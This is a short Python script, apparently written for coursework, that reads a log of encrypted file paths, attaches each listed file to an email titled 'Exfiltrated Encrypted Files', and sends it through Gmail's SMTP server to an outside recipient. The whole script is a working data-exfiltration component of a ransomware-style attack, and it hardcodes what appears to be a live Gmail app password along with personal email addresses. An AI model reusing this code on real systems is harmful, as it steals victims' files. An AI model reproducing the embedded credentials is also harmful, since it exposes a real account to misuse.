import os
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

SMTP_SERVER = "smtp.gmail.com"       
SMTP_PORT = 587                      
SMTP_USERNAME = "not.secure.mail123@gmail.com"
SMTP_PASSWORD = "uvbd evoy dvoj teov"
RECIPIENT_EMAIL = "hwsabdelgawad@gmail.com"
ENCRYPTED_FILES_LOG = "/home/hgawad/Desktop/coursework/Encrypted_Files.log"  

def collect_encrypted_files(log_file):
    files=[]
    with open(log_file, "r") as f:
        lines = f.readlines()

    for line in lines:
       files.append(line.strip())
    return files
       
def msg_constructor(files):
    msg = MIMEMultipart()
    msg['From'] = SMTP_USERNAME
    msg['To'] = RECIPIENT_EMAIL
    msg['Subject'] = "Exfiltrated Encrypted Files"

    
    msg.attach(MIMEText(f"Attached {len(files)} encrypted files.", 'plain'))

    
    for file_path in files:
            with open(file_path, "rb") as f:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header(
                    'Content-Disposition',
                    f'attachment; filename="{os.path.basename(file_path)}"'
                )
                msg.attach(part)
    return msg

def msg_sending(msg):
    with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.starttls()  
            server.login(SMTP_USERNAME, SMTP_PASSWORD)
            server.send_message(msg)
    
files = collect_encrypted_files(ENCRYPTED_FILES_LOG)
msg=msg_constructor(files)
msg_sending(msg)
